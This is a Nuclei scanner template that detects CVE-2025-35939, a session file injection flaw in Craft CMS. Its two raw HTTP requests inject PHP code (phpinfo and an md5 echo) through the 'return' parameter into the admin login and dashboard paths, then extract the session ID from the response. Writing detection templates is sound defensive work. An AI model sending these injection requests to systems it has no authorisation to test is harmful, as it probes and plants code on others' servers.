id: CVE-2025-35939

info:
  name: Craft CMS < 5.7.5 / < 4.15.3 - Session File Injection
  author: intelligent-ears
  severity: medium
  description: |
    Craft CMS stores arbitrary content from unauthenticated users in session files without sanitization.
    Attackers can inject PHP code into session files via the return parameter, potentially leading to RCE
    if session files are accessible through a separate vulnerability.
  reference:
    - https://github.com/craftcms/cms/pull/17220
    - https://github.com/craftcms/cms/releases/tag/4.15.3
    - https://github.com/craftcms/cms/releases/tag/5.7.5
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-35939
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
    cvss-score: 6.9
    cve-id: CVE-2025-35939
    cwe-id: CWE-472
  metadata:
    verified: true
    max-request: 2
    vendor: craftcms
    product: craft_cms
  tags: cve,cve2025,craftcms,session,injection,unauth,kev

http:
  - raw:
      - |
        GET /admin/login?return=test_{{randstr}}<?php+phpinfo();+?> HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

      - |
        GET /admin/dashboard?return=/vuln_{{randstr}}<?php+echo+md5('test');+?> HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    cookie-reuse: true

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "CraftSessionId="
        case-insensitive: true

      - type: word
        part: header
        words:
          - "Location:"
        case-insensitive: true

    extractors:
      - type: regex
        part: header
        name: session_id
        group: 1
        regex:
          - "CraftSessionId=([a-zA-Z0-9]+)"

      - type: regex
        part: header
        name: redirect_location
        group: 1
        regex:
          - 'Location:\s*(.+)'
